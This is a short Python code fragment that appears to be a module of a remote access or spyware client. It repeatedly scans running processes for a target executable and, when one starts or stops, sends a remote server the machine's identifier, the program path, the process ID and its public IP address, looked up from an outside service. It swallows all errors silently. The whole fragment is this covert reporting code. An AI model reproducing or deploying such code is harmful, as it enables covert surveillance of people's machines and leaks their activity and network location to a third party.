class appoption:
    lists = {}

    @classmethod
    def __init__(self, server, path, how='both'):
        if path in self.lists:
            self.lists[path] = False
            return
        self.lists[path] = True
        now = []
        while self.lists.get(path):
            for me in psutil.process_iter():
                try:
                    if os.path.samefile(me.exe(), path) and me not in now:
                        now.append(me)
                        if how in ['both', 'start']:
                            _send(
                                server,
                                '''inpu({!r}+" running. PID="+{!r}+"\\\\n'''
                                '''iP-Public:"+{!r},'95',0)'''.format(
                                    Myid + ' : ' + me.exe(), str(me.pid),
                                    requests.get('http://ip.42.pl/raw').text
                                )
                            )
                except:
                    pass
            for me in list(now):
                try:
                    status = me.status()
                except psutil.ZombieProcess:
                    status = "zombie"
                except psutil.NoSuchProcess:
                    status = "terminated"
                except psutil.AccessDenied:
                    status = "AccessDenied"
                except:
                    status = "None"
                if status != 'running' and status != self.lists[path]:
                    self.lists[path] = status
                    if status == 'terminated':
                        now.remove(me)
                    if how in ['both', 'stop']:
                        _send(
                            server,
                            '''inpu({!r}+" {}. PID="+{!r}+"\\\\n'''
                            '''iP-Public:"+{!r},"95",0)'''.format(
                                Myid + ' : ' + me.exe(), status, str(me.pid),
                                requests.get('http://ip.42.pl/raw').text
                            )
                        )
            time.sleep(2)
        del self.lists[path]
